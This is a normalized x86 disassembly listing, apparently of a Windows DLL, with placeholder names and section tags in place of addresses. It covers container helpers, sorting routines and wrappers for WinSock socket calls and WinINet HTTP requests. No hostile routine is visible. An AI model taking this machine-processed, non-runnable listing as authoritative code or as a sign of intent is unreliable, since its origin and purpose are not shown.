je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ae26
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
lea eax [ edi + 0x28 ]
sub_100186b1
push 0x4
mov eax sub_100518f0
call sub_1002b2a6
mov esi ecx
push 0x40
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_100185b4
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_1002b37e
retn
sub_10018713
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ecx
sar eax 0x1
cmp eax 0x28
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_10018aa3
inc eax
cdq
and edx 0x7
add eax edx
sar eax 0x3
push ebx
mov ebx eax
push esi
lea esi [ eax + eax ]
shl ebx 0x2
lea eax [ esi + ecx ]
lea edi [ ebx + ecx ]
mov [ ebp - 0x4 ] eax
call sub_10018aa3
mov eax [ ebp + 0x8 ]
mov ecx eax
lea edi [ esi + eax ]
sub ecx esi
call sub_10018aa3
mov edi [ ebp + 0xc ]
mov eax edi
sub eax esi
mov ecx edi
sub ecx ebx
mov [ ebp + 0xc ] eax
call sub_10018aa3
mov edi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_10018aa3
pop esi
pop ebx
jmp r-xdata
pop edi
leave
retn
sub_10018787
push 0x20
mov eax sub_1004fc1d
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ebx [ eax + 0x8 ]
lea eax [ ebp + 0xc ]
lea esi [ ebp - 0x2c ]
call sub_100179fc
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
sub esp 0x18
mov esi esp
mov [ ebp - 0x10 ] esp
call sub_100179fc
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
call sub_10018b9f
cmp [ ebp - 0x1c ] 0x8
mov bl al
jbe r-xdata
mov ecx [ ebp - 0x14 ]
movzx eax bl
neg eax
sbb eax eax
and eax rw-data
cmp [ ebp + 0x1c ] 0x8
mov [ ecx ] eax
jbe r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_1002b37e
retn 0x1c
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ebp - 0x2c ]
call sub_10027c56
pop ecx
push [ ebp + 0xc ]
call sub_10027c56
pop ecx
sub_1001881e
push 0x30
mov eax sub_1005168d
call sub_1002b2a6
mov edi ecx
lea eax [ ebp + 0x64 ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_10018d2b
test al al
jne r-xdata
lea esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x0
call sub_10017cc8
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp + 0x64 ]
call sub_10017cc8
call sub_1002b37e
retn 0xac
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ecx
cdq
push 0x1c
pop esi
idiv esi
push esi
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
sub eax ecx
cdq
pop ecx
idiv ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
lea eax [ ebp + 0x64 ]
lea esi [ ebp + 0x14 ]
call sub_10018d2b
test al al
je r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x20 ]
call sub_1000986e
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp + 0x14 ]
call sub_100189bf
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x1c ]
mov ecx edi
push [ ebp - 0x20 ]
push eax
call sub_1001538a
push 0x0
push 0x1
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x1
call sub_1000264e
lea esi [ ebp + 0x14 ]
call sub_10017f3f
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x18 ]
imul esi esi 0x1c
mov ecx [ edi + 0xc ]
imul ebx ebx 0x1c
lea eax [ esi + ecx ]
add ecx ebx
call sub_1001899d
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
add ecx esi
call sub_1001899d
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
add ecx ebx
call sub_1001899d
sub_10018909
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10018628
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_10018943
push 0x4
mov eax sub_10050146
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_100185e1
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000ab7f
mov eax esi
call sub_1002b37e
retn
sub_1001899d
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi edi
jne r-xdata
sub edi 0x1c
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push esi
mov ecx edi
call sub_10001b7e
pop ecx
add esi 0x1c
sub_100189d7
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x4
je r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] rw-data
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x5 ] 0x0
pop edi
retn
push ebx
push [ esp + 0x10 ]
mov ebx [ esp + 0x10 ]
call sub_10018a2b
pop ecx
pop ebx
pop edi
retn
sub_10018a07
push ebp
mov ebp esp
and esp 0xfffffff8
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10017e82
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_10018a2b
push 0x4
mov eax sub_1004fbf2
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
xor eax eax
cmp edi eax
je r-xdata
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
cmp edi 0x1
je r-xdata
cmp edi 0x1
jne r-xdata
mov eax ebx
call sub_100179fc
mov eax [ ebx + 0x14 ]
mov [ esi + 0x14 ] eax
cmp edi 0x2
jne r-xdata
call sub_1002b37e
retn
mov eax ebx
cmp edi 0x3
jne r-xdata
mov eax esi
jmp r-xdata
mov [ esi ] rw-data
mov [ esi + 0x4 ] al
mov [ esi + 0x5 ] al
jmp r-xdata
mov ecx [ esi ]
push rw-data
call sub_100275b0
movzx eax al
neg eax
sbb eax eax
and eax ebx
mov [ esi ] eax
jmp r-xdata
call sub_10017910
sub_10018aa3
movzx edx [ ecx ]
push esi
movzx esi [ eax ]
cmp si dx
jae r-xdata
movzx edx [ edi ]
movzx esi [ eax ]
cmp dx si
jae r-xdata
cmp eax ecx
je r-xdata
movzx edx [ eax ]
movzx esi [ ecx ]
cmp dx si
jae r-xdata
cmp edi eax
je r-xdata
movzx esi si
mov [ eax ] dx
mov [ ecx ] si
pop esi
retn
cmp eax ecx
je r-xdata
movzx edx dx
mov [ edi ] si
mov [ eax ] dx
movzx edx dx
mov [ eax ] si
mov [ ecx ] dx
sub_10018aee
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
lea eax [ esi + esi + 0x2 ]
cmp eax edi
mov [ ebp - 0x4 ] esi
jge r-xdata
jne r-xdata
push ebx
lea eax [ esi - 0x1 ]
jmp r-xdata
mov ax [ ecx + edi * 2 - 0x2 ]
mov [ ecx + esi * 2 ] ax
lea esi [ edi - 0x1 ]
lea edx [ eax + eax ]
mov bx [ edx + ecx ]
mov [ ecx + esi * 2 ] bx
mov esi eax
lea eax [ edx + 0x2 ]
cmp eax edi
jl r-xdata
dec eax
cdq
sub eax edx
sar eax 0x1
cmp [ ebp - 0x4 ] esi
jl r-xdata
mov dx [ ecx + eax * 2 ]
cmp dx [ ecx + eax * 2 - 0x2 ]
jae r-xdata
pop ebx
movzx edx [ ecx + eax * 2 ]
cmp dx [ ebp + 0x8 ]
jae r-xdata
mov ax [ ebp + 0x8 ]
mov [ ecx + esi * 2 ] ax
pop esi
leave
retn
mov [ ecx + esi * 2 ] dx
mov esi eax
dec eax
sub_10018b9f
push 0x4
mov eax sub_1004fbc9
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_10018f28
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x18 ] 0x8
jbe r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea eax [ ebp + 0x8 ]
sub esp 0x18
mov esi esp
mov [ ebp - 0x10 ] esp
call sub_100179fc
mov eax [ ebp + 0x1c ]
mov ecx ebx
mov [ esi + 0x14 ] eax
call sub_10018c5e
cmp [ ebp + 0x18 ] 0x8
jbe r-xdata
xor al al
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_10027c56
pop ecx
call sub_1002b37e
retn 0x1c
push [ ebp + 0x8 ]
call sub_10027c56
pop ecx
sub_10018c1b
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push ebx
mov ebx [ eax + 0xc ]
push edi
mov edi [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi + 0x18 ] 0x7
call sub_10002630
push ebx
push edi
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push esi
call sub_10018ca9
pop edi
mov eax esi
pop ebx
leave
retn
sub_10018c5e
push 0x8
mov eax sub_1004fba6
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x8
jbe r-xdata
lea eax [ ebp + 0x8 ]
call sub_100179fc
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
call sub_1002b37e
retn 0x1c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_10027c56
pop ecx
sub_10018ca9
push 0xc
mov eax sub_10050118
call sub_1002b2d9
push [ ebp + 0x1c ]
xor edi edi
push [ ebp + 0x18 ]
lea esi [ ebp - 0x14 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] edi
push [ ebp + 0x10 ]
call sub_10006da6
mov ecx [ ebp + 0x8 ]
add esp 0x10
push [ ebp - 0x14 ]
call sub_10006c8d
mov [ ebp - 0x4 ] edi
call sub_1002b37e
retn 0x18
lea ecx [ ebp + 0x10 ]
call sub_10006f37
movzx eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push 0x1
call sub_10005db8
lea ecx [ ebp + 0x10 ]
call sub_10006d3f
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10006d7a
test al al
jne r-xdata
sub_10018d2b
cmp [ esi ] 0x0
push edi
mov edi eax
je r-xdata
mov dl 0x1
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor dl dl
jmp r-xdata
xor eax eax
cmp dl cl
sete al
pop edi
retn
test cl cl
jne r-xdata
xor cl cl
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
push [ edi + 0x2c ]
push [ edi + 0x28 ]
push [ edi + 0x24 ]
push [ edi + 0x20 ]
push [ esi + 0x2c ]
push [ esi + 0x28 ]
push [ esi + 0x24 ]
push [ esi + 0x20 ]
call sub_10018dae
add esp 0x20
test al al
je r-xdata
test dl dl
jne r-xdata
xor eax eax
pop edi
retn
lea eax [ edi + 0x30 ]
push eax
lea ecx [ esi + 0x30 ]
call sub_10006d7a
test al al
je r-xdata
add edi 0x38
push edi
lea ecx [ esi + 0x38 ]
call sub_10006d7a
test al al
je r-xdata
xor eax eax
inc eax
pop edi
retn
sub_10018dae
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
push eax
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] edx
call sub_10006ee7
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] edi
call sub_10006ee7
cmp [ ebp - 0x4 ] eax
jne r-xdata
xor eax eax
push [ ebp - 0x14 ]
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_10018e35
add esp 0x18
test al al
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10018e35
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx eax
sub eax esi
push edi
mov edi [ ebp + 0x1c ]
sar eax 0x1
push eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ecx
push eax
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edi
call sub_10018e85
mov eax esi
cmp esi ebx
je r-xdata
mov al 0x1
sub edi esi
xor al al
jmp r-xdata
inc eax
inc eax
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov cx [ eax ]
cmp cx [ edi + eax ]
jne r-xdata
sub_10018e85
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10018eb2
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10018eb2
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
lea eax [ edi + edi ]
add [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
lea ecx [ ecx + ebx * 2 ]
lea edx [ edx + edi * 2 ]
pop ebx
cmp edx ecx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_10018f4c
push 0x38
mov eax sub_10050cc2
call sub_1002b2a6
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x44 ]
call sub_10018fbb
pop ecx
and [ ebp - 0x4 ] 0x0
push eax
lea eax [ ebp - 0x28 ]
push r--data
push eax
call sub_10016103
add esp 0xc
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ esi ] r--data
call sub_100020e2
push 0x0
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
mov [ esi + 0x28 ] eax
mov [ esi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
sub_10018fbb
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x20 ] 0x0
push ebx
push edi
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
mov ebx ecx
call sub_10018ff2
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub_10018ff2
push 0x8
mov eax sub_10050c97
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov ecx ebx
mov [ ebp - 0x14 ] ebx
lea esi [ eax + 0x14 ]
call sub_100082a7
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax edi
test edi edi
jge r-xdata
push eax
mov ecx esi
call sub_10016197
pop ecx
test edi edi
jge r-xdata
neg eax
push [ ebp - 0x14 ]
push esi
push eax
push ebx
call sub_10016269
mov eax ebx
call sub_1002b37e
retn
dec eax
mov [ eax ] 0x2d
sub_10019049
push ebp
mov ebp esp
sub esp 0x2c
push esi
mov esi eax
or [ esi + 0x194 ] 0xffffffff
lea eax [ esi + 0x4 ]
push eax
push 0x202
mov [ esi ] r--data
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov [ esi + 0x194 ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
lea esi [ ebp - 0x2c ]
call sub_10018f4c
push r--data
mov eax esi
push eax
call sub_1002ae74
mov eax esi
pop esi
leave
retn
call [ WSAGetLastError@IAT ]
jmp r-xdata
sub_100190e6
push ebp
mov ebp esp
sub esp 0x2c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x194 ]
call [ setsockopt@IAT ]
test eax eax
je r-xdata
leave
retn 0x10
call [ WSAGetLastError@IAT ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10018f4c
push r--data
mov eax esi
push eax
call sub_1002ae74
sub_10019128
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
push 0x4
lea edx [ ebp - 0x4 ]
push edx
push 0x1006
push 0xffff
mov [ ebp - 0x4 ] 0x64
call [ eax + 0x10 ]
leave
retn
sub_1001914a
push ebp
mov ebp esp
push ecx
mov edx [ ecx ]
push esi
push 0x4
xor eax eax
inc eax
lea esi [ ebp - 0x4 ]
push esi
push eax
push 0x6
mov [ ebp - 0x4 ] eax
call [ edx + 0x10 ]
pop esi
leave
retn
sub_10019166
push ebp
mov ebp esp
sub esp 0x2c
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x194 ]
call [ connect@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
call [ WSAGetLastError@IAT ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10018f4c
push r--data
mov eax esi
push eax
call sub_1002ae74
sub_100191a4
push ebp
mov ebp esp
sub esp 0x30
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x194 ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ WSAGetLastError@IAT ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10018f4c
push r--data
mov eax esi
push eax
call sub_1002ae74
test eax eax
jge r-xdata
pop esi
leave
retn 0xc
sub_100191ea
push ebp
mov ebp esp
sub esp 0x30
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x194 ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ WSAGetLastError@IAT ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10018f4c
push r--data
mov eax esi
push eax
call sub_1002ae74
test eax eax
jge r-xdata
pop esi
leave
retn 0xc
sub_10019252
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
mov edi ecx
mov esi edx
call sub_10019605
mov esi [ ebp + 0x8 ]
mov ebx eax
call sub_10019605
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
xor esi esi
push esi
push eax
push ebx
push esi
push edi
call [ InternetOpenW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001486a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov eax edi
call sub_1002b37e
retn
sub_100192fd
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov edi ecx
mov esi edx
call sub_10019605
mov esi [ ebp + 0xc ]
mov ebx eax
call sub_10019605
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
xor esi esi
push esi
push esi
push 0x3
push eax
push ebx
push 0x50
push edi
push ecx
call [ InternetConnectW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001486a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov eax edi
call sub_1002b37e
retn
sub_100193a8
push 0x24
mov eax sub_10050c40
call sub_1002b2a6
mov edi ecx
mov esi edx
call sub_10019605
mov esi [ ebp + 0xc ]
mov ebx eax
call sub_10019605
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10019605
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_10019605
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
xor esi esi
push esi
push esi
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push edi
push ebx
push ecx
call [ HttpOpenRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov edi eax
call sub_10001ebc
lea eax [ ebp - 0x30 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001486a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
mov eax edi
call sub_1002b37e
retn
sub_1001943e
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
mov esi ecx
call sub_10019605
push [ ebp + 0x10 ]
mov esi [ esi + 0x14 ]
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
push esi
push eax
push ecx
call [ HttpSendRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn 0xc
sub_100194a5
push 0x20
mov eax sub_10050bfa
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ InternetReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov edi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x10 ]
call sub_1002b37e
retn 0xc
sub_1001950b
push 0x28
mov eax sub_1005165a
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x20000013
push eax
mov [ ebp - 0x14 ] 0x4
call [ HttpQueryInfoW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov edi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
mov eax [ ebp - 0x10 ]
call sub_1002b37e
retn 0x4
sub_1001957d
push 0x48
mov eax sub_100529c8
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
test ecx ecx
jne r-xdata
call sub_1002b37e
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_1002ae74
sub_10019624
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
call [ InternetQueryOptionW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn 0x10
sub_10019681
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
call [ InternetSetOptionW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn 0x10
sub_100196de
push r--data
push [ esp + 0x8 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x10
cmp [ esp + 0x4 ] 0x3ef
jne r-xdata
push 0x3
call sub_1002adeb
int3
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
sub_10019747
or [ esi + 0x260 ] 0xffffffff
xor ecx ecx
push 0x100
lea eax [ esi + 0x58 ]
push ecx
push eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x4c ] ecx
mov [ esi + 0x50 ] ecx
call sub_10027650
add esp 0xc
inc [ esi + 0x26c ]
retn
sub_10019787
push ebx
xor ebx ebx
push esi
cmp edi ebx
je r-xdata
push 0xfffffffe
cmp [ edi + 0x24 ] ebx
jne r-xdata
cmp [ edi + 0x28 ] ebx
jne r-xdata
mov [ edi + 0x24 ] sub_10019724
push 0x1
push 0xd9b0
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov esi eax
add esp 0xc
cmp esi ebx
jne r-xdata
mov [ edi + 0x28 ] sub_10019735
push 0x1
mov [ esi ] edi
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
push 0x36ee80
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x10 ] eax
push 0x36ef08
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x14 ] eax
push 0x40004
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov ecx [ esi + 0x10 ]
add esp 0x24
mov [ esi + 0x18 ] eax
cmp ecx ebx
je r-xdata
push 0xfffffffd
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x14 ]
cmp edx ebx
je r-xdata
pop eax
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
cmp ecx ebx
je r-xdata
